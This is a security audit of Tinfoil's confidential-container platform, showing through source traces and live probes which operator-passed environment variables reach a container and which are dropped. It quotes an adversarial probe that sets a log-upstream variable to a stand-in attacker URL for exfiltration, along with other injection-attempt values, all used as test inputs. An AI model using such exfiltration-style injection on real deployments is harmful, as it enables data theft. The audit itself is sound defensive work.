# Tinfoil Confidential Containers — Operator-Side Audit

**Audit date:** 2026-04-30
**Scope:** Tinfoil Containers product (third-party container hosting), admin-key access on org `andrew-miller`.
**CLI:** [`tinfoilsh/tinfoil-cli`](https://github.com/tinfoilsh/tinfoil-cli) v0.13.0
**Controlplane:** `https://api.tinfoil.sh`
**CVM image source:** [`tinfoilsh/cvmimage`](https://github.com/tinfoilsh/cvmimage) (in particular `tinfoil/cmd/boot/{config.go,containers.go}`)
**Sister case study:** [`tinfoil-confidential-inference`](../tinfoil-confidential-inference/DEVPROOF-REPORT.md) — outside-in audit of the managed-inference deployment.
**Re-verifier:** [`amiller/awesome-private-inference: verifiers/tinfoil.py`](https://github.com/amiller/awesome-private-inference/blob/main/verifiers/tinfoil.py)
**Test container repo:** [`amiller/devproof-tinfoil-experiments`](https://github.com/amiller/devproof-tinfoil-experiments) — tags `v0.3` (env-echo, no env declared) and `v0.4` (env-echo with one map-form + one string-form slot).

> **Retraction (earlier draft of this report).** An earlier version of this file claimed `tinfoil container create --variable KEY=VALUE` was a "fourth, undetectable env-injection class" — operator-controllable runtime env that bypassed the attestation surface. **That claim was wrong.** Empirical testing with an env-echoing container shows that undeclared `--variable` keys are silently dropped, and `--variable` overrides of map-form attested values are silently ignored. The dispatch is in cvmimage's `buildEnv` ([containers.go:397-432](https://github.com/tinfoilsh/cvmimage/blob/main/tinfoil/cmd/boot/containers.go#L397-L432)) — it iterates only the declared `envItems`, never consults the external config for undeclared keys, and never lets external values override map-form ones. The sister case study's three-class model of operator-controllable env was correct from the start; this report now empirically confirms it instead of contradicting it.

---

## Executive Summary

The sister case study reasoned about Tinfoil's operator surface from cvmimage source code. This audit empirically confirms that reading by deploying real containers under admin access and comparing what the operator passes against what the container actually receives.

**The verifier's slot list is the complete operator surface.** For any third-party Tinfoil container deploy, the only operator-controllable runtime env vars are:

| Source | Declared in attested config? | In SEV launch measurement? | Verifier flags? | Container actually receives operator's value? |
|---|---|---|---|---|
| Map-form `- VAR: value` | yes (name + value) | yes (via `tinfoil-config-hash=` in cmdline) | `env_attested` | **No — YAML value always wins** |
| String-form `- VAR` | name only | name only | `env_external` | **Yes — fills from `--variable VAR=…` or external-config disk** |
| `secrets: - VAR` | name only | name only | `secrets_external` | **Yes — value from org secret store, host-plaintext per docs** |
| `--variable VAR=…` for undeclared `VAR` | no | no | n/a | **No — silently dropped at boot** |

Rows 1 and 4 are *not* operator-controllable at runtime even though it might look like they are from the CLI surface: the platform accepts the flag, the dashboard echoes it back, but the cvmimage boot script never reads the value into the container's env.

### What's actually a finding

Filtering out the things-that-look-like-backdoors-but-aren't, the remaining concerns are:

1. **The stock hello-world template ships with an unattested `secrets: [API_KEY]` slot.** Every user who copy-pastes `tinfoilsh/tinfoil-containers-hello-world` starts with `runtime_config_fully_attested = False`.
2. **Secrets pass through the host plaintext.** Tinfoil's own docs ([containers/secrets-and-env-vars](https://docs.tinfoil.sh/containers/secrets-and-env-vars)) say so explicitly. The verifier flags the slot but does not say "and the value crosses the trust boundary unencrypted." Worth surfacing in the verifier report and in user-facing docs.
3. **The CLI's `--variable` flag is misleadingly named.** [`tinfoil-cli/container.go:164`](https://github.com/tinfoilsh/tinfoil-cli/blob/main/container.go#L164) calls it `"Override environment variable in KEY=VALUE form"`. Per cvmimage source ([containers.go:401-419](https://github.com/tinfoilsh/cvmimage/blob/main/tinfoil/cmd/boot/containers.go#L401-L419)), it overrides nothing of the kind — it can only fill string-form slots and is silently dropped for everything else. UX issue, not a security one, but it directly invited the wrong conclusion in the earlier draft of this report.
4. **`tinfoil container get` is asymmetric about operator inputs.** The default table-form output shows `Variables: NAME1, NAME2` (just the names). The `-o json` form returns `"variables": "<base64>"` with the values. The attested config doesn't know about either. None of these inconsistencies hide values from anyone who matters (the operator passed them; the verifier doesn't need them); the issue is that they invite operator self-deception.

---

## Source-code trace

### How `--variable` flows from CLI to container env

```
CLI                                   Controlplane                       CVM boot
─────────────────────────────────     ────────────────────────────       ─────────────────────────────
tinfoil container create \            POST /api/containers               tinfoil-ext-config disk
  --variable KEY=VALUE                body = {                           (no integrity check, no
  --secret SECRET_NAME                  variables: {KEY: VALUE},          measurement, written
                                        secrets:   [SECRET_NAME]          verbatim by controlplane)
                                      }                                   ↓
                                                                          loadExternalConfig() reads,
                                                                          getExternalConfig() parses
                                                                          ↓
                                                                          buildEnv(envItems, secrets,
                                                                                   extConfig)
                                                                          for each `envItems` entry:
                                                                            string  → extConfig.Env[v]
                                                                            map     → YAML value
                                                                          for each `secrets` entry:
                                                                            extConfig.GetSecret(key)
```

The four operator inputs (`--variable`, `--secret`, `--ssh-key`, `--debug`) all flow through the controlplane API and end up on the unmeasured `/dev/disk/by-id/scsi-0QEMU_QEMU_HARDDISK_tinfoil-ext-config` disk. The boot script reads that disk verbatim ([config.go:189-204](https://github.com/tinfoilsh/cvmimage/blob/main/tinfoil/cmd/boot/config.go#L189-L204)) — no hash check, in contrast with the *attested* config disk which is hashed against `tinfoil-config-hash=` from the SEV-launch-measured cmdline ([config.go:97-119](https://github.com/tinfoilsh/cvmimage/blob/main/tinfoil/cmd/boot/config.go#L97-L119)).

### `buildEnv` — the dispatch that decides what reaches the container

The 36 lines below are the entire policy that determines which env vars a Tinfoil container receives ([containers.go:397-432](https://github.com/tinfoilsh/cvmimage/blob/main/tinfoil/cmd/boot/containers.go#L397-L432)):

```go
func buildEnv(envItems []interface{}, secrets []string, extConfig *shimconfig.ExternalConfig) []string {
    var env []string

    for _, item := range envItems {                               // ← iterates *only* the YAML's env: list
        switch v := item.(type) {
        case string:
            // String entry: lookup from external-config env section
            if extConfig != nil && extConfig.Env != nil {
                if val, ok := extConfig.Env[v]; ok {
                    env = append(env, v+"="+val)                  // ← string-form: fills from extConfig
                } else {
                    log.Printf("Warning: env key %s not found in external config", v)
                }
            } else {
                log.Printf("Warning: env key %s not found (no external config)", v)
            }
        case map[string]interface{}:
            // Map entry: hardcoded value
            for k, val := range v {
                env = append(env, k+"="+fmt.Sprint(val))           // ← map-form: YAML value, never consults extConfig
            }
        }
    }

    for _, key := range secrets {                                 // ← only declared secrets
        if v := extConfig.GetSecret(key); v != "" {
            env = append(env, key+"="+v)
        } else {
            log.Printf("Warning: secret key %s not found in external config", key)
        }
    }

    return env
}
```

Three behaviors fall straight out of those lines:

1. **Undeclared `--variable` keys are silently dropped.** The outer loop is `for _, item := range envItems` — the YAML's `env:` list. If the operator passes `--variable UNDECLARED=...`, it lands in `extConfig.Env["UNDECLARED"]`, but no iteration of the loop ever asks for that key. The function returns and the container never sees it.
2. **Map-form attested values cannot be overridden.** The `case map[string]interface{}` branch reads only from the YAML key/value pair (`v`). It never touches `extConfig`. The operator's `--variable` value is in `extConfig.Env` but is unreachable from this code path.
3. **The Container struct comments document this exact contract.** From [config.go:49-55](https://github.com/tinfoilsh/cvmimage/blob/main/tinfoil/cmd/boot/config.go#L49-L55):
    ```go
    // Environment variables:
    // - "VAR" (string) = lookup VAR from external-config.yml
    // - "VAR: value" (map) = hardcoded value (attested)
    Env []interface{} `yaml:"env,omitempty"`

    // Secrets: list of keys to lookup from external-config.yml (sensitive)
    Secrets []string `yaml:"secrets,omitempty"`
    ```

### How the verifier surfaces this

[`verifiers/tinfoil.py`](https://github.com/amiller/awesome-private-inference/blob/main/verifiers/tinfoil.py)'s `_audit_attested_config` walks the YAML's `env:` list with the same shape-dispatch as `buildEnv` and tallies each container's slots:

```python
{
  "env_attested":    [<map-form names — value also in attested config>],
  "env_external":    [<string-form names — value from external-config disk>],
  "secrets_external":[<secrets: names — value from external-config disk>],
}
```

`runtime_config_fully_attested` is `True` only when every container has empty `env_external` and `secrets_external` lists. By construction, this flag is the structurally-honest summary of the operator surface defined by `buildEnv` — not a heuristic.

---

## Probes

All probes ran 2026-04-30 against `https://api.tinfoil.sh` with CLI v0.13.0. Host: `control.inf6.tinfoil.sh` (AMD SEV-SNP, H200 GPU; we requested 0 GPUs).

### Probe v0.3 — undeclared `--variable` is dropped

Repo: [`amiller/devproof-tinfoil-experiments@v0.3`](https://github.com/amiller/devproof-tinfoil-experiments/releases/tag/v0.3). YAML declares **no** env entries; the container is a one-line Python HTTP server that JSON-dumps `os.environ`.

```yaml
containers:
  - name: env-echo
    image: python:3.11-alpine@sha256:8b5bfdb1fd2d78aa94e21c4d61be52487693f54be7f1021647751ff365795703
    command: [python3, -c, "...HTTPServer that returns json.dumps(dict(os.environ))..."]
```

Deploy:

```
$ tinfoil container relaunch env-echo --tag v0.3 \
    --variable TEST_INJECTION=evil_exfil_value
```

Container response (`curl -k https://env-echo.andrew-miller.containers.tinfoil.dev/`):

```json
{
    "PATH": "/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
    "HOSTNAME": "tinfoil",
    "LANG": "C.UTF-8",
    "GPG_KEY": "A035C8C19219BA821ECEA86B64E628F8D684696D",
    "PYTHON_VERSION": "3.11.15",
    "PYTHON_SHA256": "272179ddd9a2e41a0fc8e42e33dfbdca0b3711aa5abf372d3f2d51543d09b625",
    "HOME": "/root"
}
```

`TEST_INJECTION` is absent. Confirmed by `buildEnv` containers.go:401: `for _, item := range envItems` — the YAML has no `envItems`, so the outer loop iterates zero times.

`tinfoil container get env-echo -o json` shows the variable was nonetheless stored:

```json
"variables": "eyJURVNUX0lOSkVDVElPTiI6ImV2aWxfZXhmaWxfdmFsdWUifQ=="
```

(base64-decodes to `{"TEST_INJECTION":"evil_exfil_value"}`.) Operator-side dashboard knows; container does not.

### Probe v0.4 — declared map-form vs declared string-form vs undeclared

Repo: [`amiller/devproof-tinfoil-experiments@v0.4`](https://github.com/amiller/devproof-tinfoil-experiments/releases/tag/v0.4). Same image, but YAML now declares one of each form:

```yaml
containers:
  - name: env-echo
    image: python:3.11-alpine@sha256:8b5bfdb1fd2d78aa94e21c4d61be52487693f54be7f1021647751ff365795703
    env:
      - HARDCODED_VAR: "from-yaml"   # map-form (attested)
      - OPERATOR_FILLABLE             # string-form (slot fillable from --variable)
    command: [...]
```

Deploy with one of each kind of operator input:

```
$ tinfoil container relaunch env-echo --tag v0.4 \
    --variable HARDCODED_VAR=override-attempt \
    --variable OPERATOR_FILLABLE=value-from-cli \
    --variable UNDECLARED=injection-attempt
```

Container response:

```json
{
    "HARDCODED_VAR": "from-yaml",          ← map-form attested wins; operator override silently rejected
    "OPERATOR_FILLABLE": "value-from-cli", ← string-form slot fills from operator input
    [no UNDECLARED key]                    ← undeclared --variable silently dropped
    ...image defaults...
}
```

Three behaviors, three matching paths in `buildEnv`:

| Container env | Trace |
|---|---|
| `HARDCODED_VAR=from-yaml` | containers.go:414-419 — `case map[string]interface{}` reads `from-yaml` from `v` (YAML), never consults `extConfig.Env` |
| `OPERATOR_FILLABLE=value-from-cli` | containers.go:403-410 — `case string` looks up `extConfig.Env["OPERATOR_FILLABLE"]`, finds `value-from-cli`, appends |
| `UNDECLARED` absent | not in the YAML's `env:` list, so `for _, item := range envItems` never visits it; `extConfig.Env["UNDECLARED"]` is never read |

Verifier output against v0.4:

```
valid = True
runtime_config_fully_attested = False
attested_config:
  containers:
    - name: env-echo
      image: python:3.11-alpine@sha256:8b5bfdb1fd2d78aa94e21c4d61be52487693f54be7f1021647751ff365795703
      image_pinned_by_digest: true
      env_attested:    [HARDCODED_VAR]      ← matches map-form
      env_external:    [OPERATOR_FILLABLE]  ← matches string-form
      secrets_external: []
```

The verifier's slot list **is** the operator-controllable surface. `HARDCODED_VAR` shows up as `env_attested` because the YAML carries its value too; `OPERATOR_FILLABLE` shows up as `env_external` because the YAML carries only the name. Anything passed via `--variable` that isn't in either list does not exist as far as the container is concerned.

### Re-interpreting the earlier devproof-hello probes

The earlier draft of this report ran two probes against [`tinfoilsh/tinfoil-containers-hello-world@v0.0.5`](https://github.com/tinfoilsh/tinfoil-containers-hello-world):

- **Probe 1 (vanilla):** `tinfoil container create --secret API_KEY` — vanilla.
- **Probe 2 (adversarial):** `tinfoil container relaunch --variable LOG_UPSTREAM=https://evil.example/exfil --variable LOG_LEVEL=trace_evil --secret API_KEY`.

It noted that the SEV measurement, Sigstore digest, and verifier slot list were byte-identical between the two and concluded operator injection was undetectable. The conclusion was wrong because the underlying premise was wrong: the v0.0.5 hello-world image is `hashicorp/http-echo`, which doesn't read either env var, so the report had no way to observe what the container actually received. Per the v0.4 trace above:

- `--variable LOG_UPSTREAM=…/exfil` — `LOG_UPSTREAM` is not declared in the v0.0.5 YAML, so it was silently dropped at boot per containers.go:401. Never reached the container.
- `--variable LOG_LEVEL=trace_evil` — `LOG_LEVEL: "info"` is declared map-form, so containers.go:414-419 wrote `LOG_LEVEL=info` to the container env regardless of the operator's flag. Override silently ignored.

Both `--variable` flags were no-ops at runtime. The attestation being identical was therefore the correct outcome (nothing relevant changed), not the smoking gun the earlier draft claimed.

---

## Real findings

### Stock template ships with an unattested `secrets:` slot

The `tinfoilsh/tinfoil-containers-hello-world` template's [`tinfoil-config.yml`](https://github.com/tinfoilsh/tinfoil-containers-hello-world/blob/v0.0.5/tinfoil-config.yml) declares:

```yaml
secrets:
  - API_KEY
```

Every user who clones the template starts with `runtime_config_fully_attested = False` because of this slot. The template's intent is presumably "show users how secrets work," but the implication for verifier-reading users is that the very first thing they ship has the most-flagged operator surface. A fully-attested template (no `secrets:`, no string-form env) would let users start green and opt into the unattested surface only when they need it.

### Secrets pass through the host plaintext

Quoted from [docs.tinfoil.sh/containers/secrets-and-env-vars](https://docs.tinfoil.sh/containers/secrets-and-env-vars):

> Secrets are **not** protected by the enclave's confidentiality boundary. They pass through the host on their way into the container.

The verifier surfaces the slot (`secrets_external: [API_KEY]`) but does not say *what kind of unattested value* is in it. For an operator who reads "secrets" and assumes "encrypted secrets," this is a meaningful gap. Recommendations: (a) Tinfoil's docs page should put this warning at the top, not in the body. (b) Our verifier could add a per-slot kind tag — `kind=secret-host-plaintext` vs `kind=string-form-extconfig` — so the report makes the trust boundary explicit.

### CLI flag naming invites operator self-deception

[`tinfoil-cli/container.go:135,164`](https://github.com/tinfoilsh/tinfoil-cli/blob/main/container.go#L164):

```go
containerCreateCmd.Flags().StringArrayVar(&createVariables, "variable", nil,
    "Environment variable in KEY=VALUE form; may be repeated")
containerRelaunchCmd.Flags().StringArrayVar(&relaunchVariables, "variable", nil,
    "Override environment variable in KEY=VALUE form")
```

The `relaunch` flag's help text says "Override environment variable" — but per `buildEnv` it cannot override map-form values, and undeclared keys are silently dropped. A CLI that warned `Variable LOG_UPSTREAM is not declared in tinfoil-config.yml; the value will be ignored at boot. (Did you mean to add `env: - LOG_UPSTREAM` to the YAML?)` would have made the earlier draft of this report impossible to write.

### `--variable` storage is not idempotent with declaration

If an operator deploys `--variable FOO=bar` once with `FOO` undeclared, then later updates the YAML to declare `FOO` (string-form), the *previous* `--variable` value will start being read into the container at the next relaunch — even though the operator never re-passed the flag for the new tag. This is because the controlplane stores the variables map per deployment, not per tag. Not security-critical (the operator is the one who passed the flag) but a stateful surprise. The cleanest fix is to clear the variables blob on `--tag` change.

---

## Updated recommendations

For Tinfoil:

1. **Reject (or warn loudly on) undeclared `--variable` and map-form-overriding `--variable` at the controlplane.** Both are no-ops at runtime; refusing them at submit time would prevent operator misunderstandings and audit-trail confusion.
2. **Surface the host-plaintext nature of `secrets:`** at the top of [containers/secrets-and-env-vars](https://docs.tinfoil.sh/containers/secrets-and-env-vars) — not buried.
3. **Ship a no-`secrets:` variant of the hello-world template** so new users start with `runtime_config_fully_attested = True`.
4. **Make the table-form `tinfoil container get` and the JSON form symmetric** about the `variables` field. Either both show full key=value pairs (current JSON) or both show just declared-vs-undeclared status.

For our re-verifier (`verifiers/tinfoil.py`):

5. **Annotate each `secrets_external` slot as `kind=secret-host-plaintext`** and each `env_external` slot as `kind=string-form-extconfig`, so the dashboard report distinguishes "value crosses the host plaintext" from "value comes from the external-config disk inside the enclave's tinfoil-ext-config block." Both go through the host one way or another, but the threat models differ.
6. **Add an `image_pinned_by_digest` row** to the per-container summary in the dashboard. The hello-world template enforces this (`image:tag@sha256:...`), but a third-party deployment can omit the digest and the verifier should flag it.

For users:

7. **Read your YAML's `env:` and `secrets:` lists, then decide.** The operator-controllable runtime surface is exactly what those two lists contain. Anything declared map-form is bound by the SEV launch measurement. Anything declared string-form or in `secrets:` is operator-controllable at deploy time.

---

## Stage Assessment (third-party container product)

ERC-733 [Stage 1 Checklist](../../README.md#stage-1-checklist):

- [x] Code auditable — open source under `tinfoilsh`
- [x] Community can reproducibly compute code measurement — `cvm-version: 0.7.5` is reproducible from `tinfoilsh/cvmimage` build chain; `tinfoilsh/measure-image-action` is the published builder
- [ ] Developer has no access to application secrets — **fails on `secrets:` slot.** Per docs, secrets pass through host plaintext. The verifier surfaces the slot existence; users still need to read the docs to learn what "external" means in this context
- [x] Well-defined upgrade process with notice period — `--tag` pins to GitHub releases; `--replace` is atomic; `update accept`/`update cancel` provides explicit operator gating
- [x] No dependency on centralized infrastructure except TEE vendors — Sigstore + GitHub OIDC + AMD KDS only
- [x] No backdoor or debug paths — `--debug` enables SSH but breaks attestation (Tinfoil's SecureClient refuses to connect, per [docs/containers/debug-mode](https://docs.tinfoil.sh/containers/debug-mode)). `--variable` is bounded to declared slots per `buildEnv`. The first row of `Stage 1 Checklist` would actually pass with a no-`secrets:` config

**Stage:** **Stage 1, conditional on the deployment having no `secrets:` slot and either no string-form `env:` slot or a clear documented justification for each one.** The hello-world template cannot pass this conditional today because of `secrets: [API_KEY]`. A trivially-modified template (`# secrets: removed for full-attestation mode`) would.

---

## Reproduction

```python
# 1. Deploy the env-echo container at v0.4
#    tinfoil container relaunch env-echo --tag v0.4 \
#      --variable HARDCODED_VAR=override-attempt \
#      --variable OPERATOR_FILLABLE=value-from-cli \
#      --variable UNDECLARED=injection-attempt

# 2. Verify the container's actual env
import requests
r = requests.get("https://env-echo.andrew-miller.containers.tinfoil.dev/", verify=False).json()
assert r["HARDCODED_VAR"]    == "from-yaml"        # map-form attested wins
assert r["OPERATOR_FILLABLE"] == "value-from-cli"  # string-form fills from --variable
assert "UNDECLARED" not in r                       # undeclared dropped

# 3. Verify the attestation surface matches the slot list
from verifiers.tinfoil import fetch_per_host_bundle, verify_bundle
bundle = fetch_per_host_bundle(
    "env-echo.andrew-miller.containers.tinfoil.dev",
    "amiller/devproof-tinfoil-experiments",
)
report = verify_bundle(bundle, repo="amiller/devproof-tinfoil-experiments")
assert report.valid
assert report.details["attested_config"]["containers"][0]["env_attested"]    == ["HARDCODED_VAR"]
assert report.details["attested_config"]["containers"][0]["env_external"]    == ["OPERATOR_FILLABLE"]
assert report.details["attested_config"]["containers"][0]["secrets_external"] == []
assert report.scorecard.runtime_config_fully_attested is False  # because of OPERATOR_FILLABLE
```

---

## Source

- **Re-verifier:** [`verifiers/tinfoil.py`](https://github.com/amiller/awesome-private-inference/blob/main/verifiers/tinfoil.py), [`verifiers/tinfoil_sev.py`](https://github.com/amiller/awesome-private-inference/blob/main/verifiers/tinfoil_sev.py)
- **CVM boot dispatch (the entire env-policy in 36 lines):** [`tinfoilsh/cvmimage/tinfoil/cmd/boot/containers.go:397-432`](https://github.com/tinfoilsh/cvmimage/blob/main/tinfoil/cmd/boot/containers.go#L397-L432)
- **CVM container struct schema (documents the dispatch contract):** [`tinfoilsh/cvmimage/tinfoil/cmd/boot/config.go:40-80`](https://github.com/tinfoilsh/cvmimage/blob/main/tinfoil/cmd/boot/config.go#L40-L80)
- **CVM external-config loader (no integrity check, contrast with `loadAndVerifyConfig`):** [`config.go:189-204`](https://github.com/tinfoilsh/cvmimage/blob/main/tinfoil/cmd/boot/config.go#L189-L204)
- **CLI `--variable` flag declaration + payload:** [`tinfoilsh/tinfoil-cli/container.go:135,164,256-268`](https://github.com/tinfoilsh/tinfoil-cli/blob/main/container.go#L135)
- **Tinfoil docs (host-plaintext secrets quote):** [`docs.tinfoil.sh/containers/secrets-and-env-vars`](https://docs.tinfoil.sh/containers/secrets-and-env-vars)
- **Test container repo:** [`amiller/devproof-tinfoil-experiments`](https://github.com/amiller/devproof-tinfoil-experiments) (tags `v0.3`, `v0.4`)

---

## Companion documents

- [`UPDATES-VS-DSTACK.md`](UPDATES-VS-DSTACK.md) — how update authority works in each platform; covers the broader `IAppAuth` design space (timelock, multisig, ZK-gated, replicatoor pattern).
- [`ARCHITECTURE-VS-DSTACK.md`](ARCHITECTURE-VS-DSTACK.md) — persistence model, gateway / TLS termination, cross-CVM identity, registry support, Tinfoil's centralization map, and a path-to-web3-grade sketch.
- [`PATTERNS-AND-USE-CASES.md`](PATTERNS-AND-USE-CASES.md) — survey of notable Tinfoil patterns (EHBP, enclave-as-anonymizer, confidential MCP, caching proxies, path allowlist), explicit platform constraints, docs gaps, and use cases worth knowing about.
- [`STAGE-733-ANALYSIS.md`](STAGE-733-ANALYSIS.md) — full ERC-733 Stage 0/1/2 walkthrough with each requirement scored against evidence; multi-vendor / lock-in analysis covering what's swappable today.

---

## Prior art

- [`tinfoil-confidential-inference`](../tinfoil-confidential-inference/DEVPROOF-REPORT.md) — sister outside-in audit; runtime-config gap section there reasoned about declared slots from cvmimage source. This audit empirically confirms it.
- [`tee-totalled`](../tee-totalled/DEVPROOF-REPORT.md) — `LLM_BASE_URL` env-var backdoor pattern. The corrected story above means a Tinfoil third-party container *cannot* trivially recreate this attack via `--variable LLM_BASE_URL=…` — the operator would need to add `env: - LLM_BASE_URL` to the YAML, which surfaces in the attested config and our verifier flags as `env_external: [LLM_BASE_URL]`. The user can read the slot list and decide.
